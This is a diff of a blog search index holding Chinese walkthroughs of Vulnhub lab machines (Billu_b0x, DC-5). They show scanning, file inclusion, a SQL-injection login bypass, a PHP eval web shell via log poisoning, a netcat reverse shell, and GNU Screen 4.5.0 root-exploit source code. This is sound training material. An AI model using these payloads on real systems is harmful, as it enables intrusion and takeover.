@@ -1,115 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>AoiAWD环境搭建</title>
-    <url>/posts/622384de/</url>
-    <content><![CDATA[<p>111</p>
-]]></content>
-      <categories>
-        <category>AWD</category>
-      </categories>
-      <tags>
-        <tag>AWD</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Billu_b0x</title>
-    <url>/posts/827ecdf7/</url>
-    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
-<p>网段        192.168.18.0/24</p>
-<p>kali        192.168.18.131</p>
-<p>靶机        192.168.18.144</p>
-</blockquote>
-<h4 id="nmap扫网段"><a href="#nmap扫网段" class="headerlink" title="nmap扫网段"></a>nmap扫网段</h4><p><code>sudo nmap 192.168.18.0/24 -sP</code></p>
-<blockquote>
-<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 19:58 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.000079s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.144<br>Host is up (0.00054s latency).<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.25 seconds</p>
-</blockquote>
-<h4 id="nmap扫端口"><a href="#nmap扫端口" class="headerlink" title="nmap扫端口"></a>nmap扫端口</h4><p><code>sudo nmap 192.168.18.144 -p- -sV</code></p>
-<blockquote>
-<p>kali@kali2020:~$ sudo nmap 192.168.18.144 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 20:00 CST<br>Nmap scan report for 192.168.18.144<br>Host is up (0.0012s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds</p>
-</blockquote>
-<p>开放了22端口和80端口</p>
-<h4 id="dirsearch扫描目录"><a href="#dirsearch扫描目录" class="headerlink" title="dirsearch扫描目录"></a>dirsearch扫描目录</h4><p><code>sudo python3 dirsearch.py -u 192.168.18.144</code></p>
-<blockquote>
-<p>[20:25:23] 200 -  307B  - /add<br>[20:25:23] 200 -  307B  - /add.php<br>[20:25:25] 200 -    1B  - /c<br>[20:25:25] 403 -  290B  - /cgi-bin/<br>[20:25:27] 403 -  286B  - /doc/<br>[20:25:27] 403 -  301B  - /doc/en/changes.html<br>[20:25:27] 403 -  290B  - /doc/api/<br>[20:25:27] 403 -  300B  - /doc/stable.version<br>[20:25:27] 200 -    3KB - /head.php<br>[20:25:28] 200 -    1KB - /images/<br>[20:25:28] 301 -  317B  - /images  -&gt;  <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a><br>[20:25:28] 200 -   47KB - /in<br>[20:25:28] 200 -    3KB - /index<br>[20:25:28] 200 -    3KB - /index.php </p>
-<p>[20:25:29] 302 -    2KB - /panel  -&gt;  index.php<br>[20:25:29] 302 -    2KB - /panel.php  -&gt;  index.php<br>[20:25:30] 200 -    8KB - /phpmy/<br>[20:25:31] 403 -  296B  - /server-status/<br>[20:25:31] 403 -  295B  - /server-status<br>[20:25:31] 200 -    1B  - /show<br>[20:25:32] 200 -   72B  - /test<br>[20:25:32] 200 -   72B  - /test.php    </p>
-</blockquote>
-<p>扫出</p>
-<p><code>add.php</code>     文件上传</p>
-<p><img src="/posts/827ecdf7/add.png"></p>
-<p><code>head.php</code> 貌似没啥东西 就一背景图</p>
-<p><img src="/posts/827ecdf7/head.png"></p>
-<p><code>test.php</code> 文件包含</p>
-<p><img src="/posts/827ecdf7/test.png"></p>
-<p><code>phpmy</code>        phpmyadmin登录页面</p>
-<p><img src="/posts/827ecdf7/phpmy.png"></p>
-<p><code>in</code>            phpinfo()</p>
-<p><img src="/posts/827ecdf7/phpinfo.png"></p>
-<blockquote>
-<p>allow_url_fopen    On<br>allow_url_include    Off<br>mysql版本为5.5.38</p>
-</blockquote>
-<h4 id="用dirb扫描目录"><a href="#用dirb扫描目录" class="headerlink" title="用dirb扫描目录"></a>用dirb扫描目录</h4><blockquote>
-<p> —- Scanning URL: <a href="http://192.168.18.144/">http://192.168.18.144/</a> —-</p>
-<ul>
-<li><a href="http://192.168.18.144/add">http://192.168.18.144/add</a> (CODE:200|SIZE:307)                                                          </li>
-<li><a href="http://192.168.18.144/c">http://192.168.18.144/c</a> (CODE:200|SIZE:1)                                                              </li>
-<li><a href="http://192.168.18.144/cgi-bin/">http://192.168.18.144/cgi-bin/</a> (CODE:403|SIZE:290)                                                     </li>
-<li><a href="http://192.168.18.144/head">http://192.168.18.144/head</a> (CODE:200|SIZE:2793)<br>==&gt; DIRECTORY: <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a>                                                             </li>
-<li><a href="http://192.168.18.144/in">http://192.168.18.144/in</a> (CODE:200|SIZE:47554)                                                         </li>
-<li><a href="http://192.168.18.144/index">http://192.168.18.144/index</a> (CODE:200|SIZE:3267)                                                       </li>
-<li><a href="http://192.168.18.144/index.php">http://192.168.18.144/index.php</a> (CODE:200|SIZE:3267)                                                   </li>
-<li><a href="http://192.168.18.144/panel">http://192.168.18.144/panel</a> (CODE:302|SIZE:2469)                                                       </li>
-<li><a href="http://192.168.18.144/server-status">http://192.168.18.144/server-status</a> (CODE:403|SIZE:295)                                                </li>
-<li><a href="http://192.168.18.144/show">http://192.168.18.144/show</a> (CODE:200|SIZE:1)                                                           </li>
-<li><a href="http://192.168.18.144/test">http://192.168.18.144/test</a> (CODE:200|SIZE:72)                                                          </li>
-</ul>
-</blockquote>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>进入主页，有一个登录框，并提示sql注入</p>
-<p><img src="/posts/827ecdf7/index.png"></p>
-<p>尝试下sql注入，用sqlmap跑一下</p>
-<p><code>sqlmap -u &#39;http://192.168.18.144/&#39;  --method POST --data &#39;un=admin&amp;os=admin&amp;login=let%27s+login&#39; --batch --dbms mysql </code></p>
-<p>没扫出来注入点</p>
-<br>
-
-<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>传一个图片马试试，或许后面会用到</p>
-<br>
-
-<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>在<code>test.php</code>get请求 传参 <code>?file=/etc/passwd</code>没反应</p>
-<p>使用post传参<code>file=/etc/passwd</code>会弹出一个下载文件窗口</p>
-<p>文件内容为<code>/etc/passwd</code>的输出内容</p>
-<p>使用burp抓包，把get包改为post包</p>
-<p><img src="/posts/827ecdf7/file_include1.png"></p>
-<blockquote>
-<p>ica:x:1000:1000:ica,,,:/home/ica:/bin/bash</p>
-</blockquote>
-<p>发现一个<code>ica</code>的用户，可以登录ssh</p>
-<br>
-
-
-<p>同时用这种方法去下载<code>add.php</code>,<code>in.php</code> <code>index.php</code> <code>test.php</code> <code>show.php</code> <code>c.php</code></p>
-<p><img src="/posts/827ecdf7/addphp.png"><br>在add.php中有文件上传的代码，没有经过任何处理，可以考虑去上传图片马在in.php中是phpinfo信息</p>
-<h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h5><p><img src="/posts/827ecdf7/cphp.png"><br>在c.php中发现了mysql数据库的账户信息<code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p>
-<blockquote>
-<p>用户名 billu密码 b0x_billu数据库名 ica_lab</p>
-</blockquote>
-<p>使用这个账户去尝试登录phpmyadmin，成功登录,并得到phpmyadmin版本为3.4.7登录后台思路一 使用phpmyadmin中账号<br><img src="/posts/827ecdf7/auth.png"><br>在anth表中得到一个账户 biLLu hEx_it使用此账户成功登录到后台</p>
-<h5 id="思路二-SQL注入再尝试查看index-php的源码"><a href="#思路二-SQL注入再尝试查看index-php的源码" class="headerlink" title="思路二 SQL注入再尝试查看index.php的源码"></a>思路二 SQL注入再尝试查看index.php的源码</h5><p><img src="/posts/827ecdf7/sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>前面使用str_replace 将单引号全部过滤掉了，<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>输入<code>pass=admin\   uname= or 1=1 --+</code><br>即 <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>成功登录文件上传<br><img src="/posts/827ecdf7/login.png"><br>审计一下panel.php<br>页面有两个功能 show users 和 add users 对于文件上传使用了白名单机制，只允许上传<code>jpeg,jpg,gif,png</code><br>当要上传一张图片是，会先判断后缀名是否正确，如果正确，还有一个mime验证<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>可以看到上传图片的路径为uploaded_images/</p>
-<p>这里传马多次都没传成功，有时间再试试吧….</p>
-<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#114;&#x6f;&#111;&#x74;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#56;&#46;&#x31;&#52;&#x34;">&#114;&#x6f;&#111;&#x74;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#56;&#46;&#x31;&#52;&#x34;</a>成功登录root用户</p>
-<p>Reference</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DCchallenges2</title>
     <url>/posts/e4e28081/</url>
     <content><![CDATA[<p>靶机DC-2下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
@@ -153,7 +44,7 @@
 <br>
 
 <blockquote>
-<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#114;&#111;&#98;&#105;&#110;&#x40;&#x64;&#105;&#x67;&#105;&#46;&#x6e;&#105;&#110;&#x6a;&#x61;">&#114;&#111;&#98;&#105;&#110;&#x40;&#x64;&#105;&#x67;&#105;&#46;&#x6e;&#105;&#110;&#x6a;&#x61;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
+<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#114;&#x6f;&#x62;&#x69;&#x6e;&#x40;&#100;&#105;&#103;&#x69;&#46;&#x6e;&#x69;&#x6e;&#x6a;&#x61;">&#114;&#x6f;&#x62;&#x69;&#x6e;&#x40;&#100;&#105;&#103;&#x69;&#46;&#x6e;&#x69;&#x6e;&#x6a;&#x61;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
 <p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
 </blockquote>
 <p>使用wpscan爆破</p>
@@ -207,6 +98,18 @@
       </categories>
       <tags>
         <tag>DCchallenges</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AoiAWD环境搭建</title>
+    <url>/posts/622384de/</url>
+    <content><![CDATA[<p>111</p>
+]]></content>
+      <categories>
+        <category>AWD</category>
+      </categories>
+      <tags>
+        <tag>AWD</tag>
       </tags>
   </entry>
   <entry>
@@ -332,74 +235,100 @@
       </tags>
   </entry>
   <entry>
-    <title>DCchallenges5</title>
-    <url>/posts/7a861522/</url>
-    <content><![CDATA[<p>环境</p>
-<blockquote>
-<p>网段 192.168.18.0/24</p>
-<p>kali      192.168.18.131</p>
-<p>靶机  192.168.18.136</p>
+    <title>Billu_b0x</title>
+    <url>/posts/827ecdf7/</url>
+    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
+<p>网段        192.168.18.0/24</p>
+<p>kali        192.168.18.131</p>
+<p>靶机        192.168.18.144</p>
 </blockquote>
-<p>nmap扫网段</p>
+<h4 id="nmap扫网段"><a href="#nmap扫网段" class="headerlink" title="nmap扫网段"></a>nmap扫网段</h4><p><code>sudo nmap 192.168.18.0/24 -sP</code></p>
 <blockquote>
-<p>kali@kali2020:~$ sudo nmap -sn 192.168.18.0/24<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:51 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.00035s latency).<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00044s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 4.25 seconds</p>
+<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 19:58 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.000079s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.144<br>Host is up (0.00054s latency).<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.25 seconds</p>
 </blockquote>
-<p>nmap扫靶机端口</p>
+<h4 id="nmap扫端口"><a href="#nmap扫端口" class="headerlink" title="nmap扫端口"></a>nmap扫端口</h4><p><code>sudo nmap 192.168.18.144 -p- -sV</code></p>
 <blockquote>
-<p>kali@kali2020:~$ sudo nmap 192.168.18.136 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:56 CST<br>Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 66.67% done; ETC: 13:56 (0:00:06 remaining)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.0015s latency).<br>Not shown: 65532 closed ports<br>PORT      STATE SERVICE VERSION<br><strong>80/tcp    open  http    nginx 1.6.2</strong><br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>60416/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)</p>
-<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds</p>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.144 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 20:00 CST<br>Nmap scan report for 192.168.18.144<br>Host is up (0.0012s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds</p>
 </blockquote>
-<p>开放了80、111和60416,80端口使用的nginx</p>
-<p>dirsearch扫目录<code>python3 dirsearch.py  -u 192.168.18.136</code></p>
+<p>开放了22端口和80端口</p>
+<h4 id="dirsearch扫描目录"><a href="#dirsearch扫描目录" class="headerlink" title="dirsearch扫描目录"></a>dirsearch扫描目录</h4><p><code>sudo python3 dirsearch.py -u 192.168.18.144</code></p>
 <blockquote>
-<p>[14:06:36] Starting:<br>[14:06:43] 200 -    4KB - /contact.php<br>[14:06:43] 301 -  184B  - /css  -&gt;  <a href="http://192.168.18.136/css/">http://192.168.18.136/css/</a><br>[14:06:44] 200 -    6KB - /faq.php<br>[14:06:45] 301 -  184B  - /images  -&gt;  <a href="http://192.168.18.136/images/">http://192.168.18.136/images/</a><br>[14:06:45] 403 -  570B  - /images/<br>[14:06:45] 200 -    4KB - /index.php<br>[14:06:48] 200 -  852B  - /thankyou.php                               </p>
+<p>[20:25:23] 200 -  307B  - /add<br>[20:25:23] 200 -  307B  - /add.php<br>[20:25:25] 200 -    1B  - /c<br>[20:25:25] 403 -  290B  - /cgi-bin/<br>[20:25:27] 403 -  286B  - /doc/<br>[20:25:27] 403 -  301B  - /doc/en/changes.html<br>[20:25:27] 403 -  290B  - /doc/api/<br>[20:25:27] 403 -  300B  - /doc/stable.version<br>[20:25:27] 200 -    3KB - /head.php<br>[20:25:28] 200 -    1KB - /images/<br>[20:25:28] 301 -  317B  - /images  -&gt;  <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a><br>[20:25:28] 200 -   47KB - /in<br>[20:25:28] 200 -    3KB - /index<br>[20:25:28] 200 -    3KB - /index.php </p>
+<p>[20:25:29] 302 -    2KB - /panel  -&gt;  index.php<br>[20:25:29] 302 -    2KB - /panel.php  -&gt;  index.php<br>[20:25:30] 200 -    8KB - /phpmy/<br>[20:25:31] 403 -  296B  - /server-status/<br>[20:25:31] 403 -  295B  - /server-status<br>[20:25:31] 200 -    1B  - /show<br>[20:25:32] 200 -   72B  - /test<br>[20:25:32] 200 -   72B  - /test.php    </p>
 </blockquote>
-<p>进入主页没看到啥提示，只有一个留言板，随便填一下看看有啥东西</p>
-<p>抓包发送数据，发现多次发送下面的<code>Copyright © 2019</code>会变化</p>
-<p>可以推测使用了footer.php，访问footer.php时年份会改变</p>
-<p>访问<code>http://192.168.18.136/footer.php</code>，年份会变化</p>
-<p>可以推测thankyou.php包含了footer.php</p>
-<p>试一下file=index.php<br><img src="/posts/7a861522/burp_fileindex.png"><br><img src="/posts/7a861522/file_index.png"><br><img src="/posts/7a861522/burp_fileetcpasswd.png"><br><br></p>
-<p>由于时nginx,访问下他的日志</p>
-<p><code>/var/log/nginx/error.log</code><br><img src="/posts/7a861522/burp_errorlog.png"><br><code>/var/log/nginx/access.log </code><br><img src="/posts/7a861522/burp_accesslog.png"><br>尝试写入日志文件来反弹shell<br><img src="/posts/7a861522/burp_eval.png"><br><code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;])?&gt;;</code><br><img src="/posts/7a861522/burp_phpinfo.png"><br>使用蚁剑连接shell<br><img src="/posts/7a861522/antsword.png"><br>whoami查看权限为<code>www-data</code>没有权限去访问/root</p>
-<p>nc命令反弹shell<br><img src="/posts/7a861522/nc_shell.png"><br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><br><br>提权</p>
-<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<p>扫出</p>
+<p><code>add.php</code>     文件上传</p>
+<p><img src="/posts/827ecdf7/add.png"></p>
+<p><code>head.php</code> 貌似没啥东西 就一背景图</p>
+<p><img src="/posts/827ecdf7/head.png"></p>
+<p><code>test.php</code> 文件包含</p>
+<p><img src="/posts/827ecdf7/test.png"></p>
+<p><code>phpmy</code>        phpmyadmin登录页面</p>
+<p><img src="/posts/827ecdf7/phpmy.png"></p>
+<p><code>in</code>            phpinfo()</p>
+<p><img src="/posts/827ecdf7/phpinfo.png"></p>
 <blockquote>
-<p>www-data@dc-5:~/html$ find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/screen-4.5.0<br>/usr/bin/gpasswd<br>/usr/bin/procmail<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/sbin/exim4<br>/sbin/mount.nfs</p>
+<p>allow_url_fopen    On<br>allow_url_include    Off<br>mysql版本为5.5.38</p>
 </blockquote>
-<p>使用screen</p>
-<blockquote>
-<p>kali@kali2020:~$ searchsploit screen 4.5.0</p>
-<hr>
-<p> Exploit Title                            |  Path</p>
-<hr>
-<p>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41152.txt<br>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41154.sh</p>
-<hr>
-<p>Shellcodes: No Results<br>kali@kali2020:<del>/Tools$ cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh<br>kali@kali2020:</del>/Tools$ cat 41154.sh </p>
+<h4 id="用dirb扫描目录"><a href="#用dirb扫描目录" class="headerlink" title="用dirb扫描目录"></a>用dirb扫描目录</h4><blockquote>
+<p> —- Scanning URL: <a href="http://192.168.18.144/">http://192.168.18.144/</a> —-</p>
+<ul>
+<li><a href="http://192.168.18.144/add">http://192.168.18.144/add</a> (CODE:200|SIZE:307)                                                          </li>
+<li><a href="http://192.168.18.144/c">http://192.168.18.144/c</a> (CODE:200|SIZE:1)                                                              </li>
+<li><a href="http://192.168.18.144/cgi-bin/">http://192.168.18.144/cgi-bin/</a> (CODE:403|SIZE:290)                                                     </li>
+<li><a href="http://192.168.18.144/head">http://192.168.18.144/head</a> (CODE:200|SIZE:2793)<br>==&gt; DIRECTORY: <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a>                                                             </li>
+<li><a href="http://192.168.18.144/in">http://192.168.18.144/in</a> (CODE:200|SIZE:47554)                                                         </li>
+<li><a href="http://192.168.18.144/index">http://192.168.18.144/index</a> (CODE:200|SIZE:3267)                                                       </li>
+<li><a href="http://192.168.18.144/index.php">http://192.168.18.144/index.php</a> (CODE:200|SIZE:3267)                                                   </li>
+<li><a href="http://192.168.18.144/panel">http://192.168.18.144/panel</a> (CODE:302|SIZE:2469)                                                       </li>
+<li><a href="http://192.168.18.144/server-status">http://192.168.18.144/server-status</a> (CODE:403|SIZE:295)                                                </li>
+<li><a href="http://192.168.18.144/show">http://192.168.18.144/show</a> (CODE:200|SIZE:1)                                                           </li>
+<li><a href="http://192.168.18.144/test">http://192.168.18.144/test</a> (CODE:200|SIZE:72)                                                          </li>
+</ul>
 </blockquote>
-<p>根据说明第一部分保存为<code>libhax.c</code></p>
-<blockquote>
-<p>#include &lt;stdio.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;unistd.h&gt;<br><strong>attribute</strong> ((<strong>constructor</strong>))<br>void dropshell(void){<br>    chown(“/tmp/rootshell”, 0, 0);<br>    chmod(“/tmp/rootshell”, 04755);<br>    unlink(“/etc/ld.so.preload”);<br>    printf(“[+] done!\n”);<br>}</p>
-</blockquote>
-<p>第二部分保存为<code>rootshell.c</code></p>
-<blockquote>
-<p>#include &lt;stdio.h&gt;<br>int main(void){<br>    setuid(0);<br>    setgid(0);<br>    seteuid(0);<br>    setegid(0);<br>    execvp(“/bin/sh”, NULL, NULL);<br>}</p>
-</blockquote>
-<p>编译</p>
-<p><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></p>
-<p><code>gcc -o rootshell rootshell.c</code></p>
-<p>将第三部分保存为exp.sh</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>进入主页，有一个登录框，并提示sql注入</p>
+<p><img src="/posts/827ecdf7/index.png"></p>
+<p>尝试下sql注入，用sqlmap跑一下</p>
+<p><code>sqlmap -u &#39;http://192.168.18.144/&#39;  --method POST --data &#39;un=admin&amp;os=admin&amp;login=let%27s+login&#39; --batch --dbms mysql </code></p>
+<p>没扫出来注入点</p>
 <br>
 
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>传一个图片马试试，或许后面会用到</p>
 <br>
 
-<p>把三个文件通过蚁剑传到靶机中<br><img src="/posts/7a861522/upload.png"><br><img src="/posts/7a861522/exp.png"><br><img src="/posts/7a861522/flag.png"></p>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>在<code>test.php</code>get请求 传参 <code>?file=/etc/passwd</code>没反应</p>
+<p>使用post传参<code>file=/etc/passwd</code>会弹出一个下载文件窗口</p>
+<p>文件内容为<code>/etc/passwd</code>的输出内容</p>
+<p>使用burp抓包，把get包改为post包</p>
+<p><img src="/posts/827ecdf7/file_include1.png"></p>
+<blockquote>
+<p>ica:x:1000:1000:ica,,,:/home/ica:/bin/bash</p>
+</blockquote>
+<p>发现一个<code>ica</code>的用户，可以登录ssh</p>
+<br>
+
+
+<p>同时用这种方法去下载<code>add.php</code>,<code>in.php</code> <code>index.php</code> <code>test.php</code> <code>show.php</code> <code>c.php</code></p>
+<p><img src="/posts/827ecdf7/addphp.png"><br>在add.php中有文件上传的代码，没有经过任何处理，可以考虑去上传图片马在in.php中是phpinfo信息</p>
+<h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h5><p><img src="/posts/827ecdf7/cphp.png"><br>在c.php中发现了mysql数据库的账户信息<code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p>
+<blockquote>
+<p>用户名 billu密码 b0x_billu数据库名 ica_lab</p>
+</blockquote>
+<p>使用这个账户去尝试登录phpmyadmin，成功登录,并得到phpmyadmin版本为3.4.7登录后台思路一 使用phpmyadmin中账号<br><img src="/posts/827ecdf7/auth.png"><br>在anth表中得到一个账户 biLLu hEx_it使用此账户成功登录到后台</p>
+<h5 id="思路二-SQL注入再尝试查看index-php的源码"><a href="#思路二-SQL注入再尝试查看index-php的源码" class="headerlink" title="思路二 SQL注入再尝试查看index.php的源码"></a>思路二 SQL注入再尝试查看index.php的源码</h5><p><img src="/posts/827ecdf7/sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>前面使用str_replace 将单引号全部过滤掉了，<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>输入<code>pass=admin\   uname= or 1=1 --+</code><br>即 <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>成功登录文件上传<br><img src="/posts/827ecdf7/login.png"><br>审计一下panel.php<br>页面有两个功能 show users 和 add users 对于文件上传使用了白名单机制，只允许上传<code>jpeg,jpg,gif,png</code><br>当要上传一张图片是，会先判断后缀名是否正确，如果正确，还有一个mime验证<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>可以看到上传图片的路径为uploaded_images/</p>
+<p>这里传马多次都没传成功，有时间再试试吧….</p>
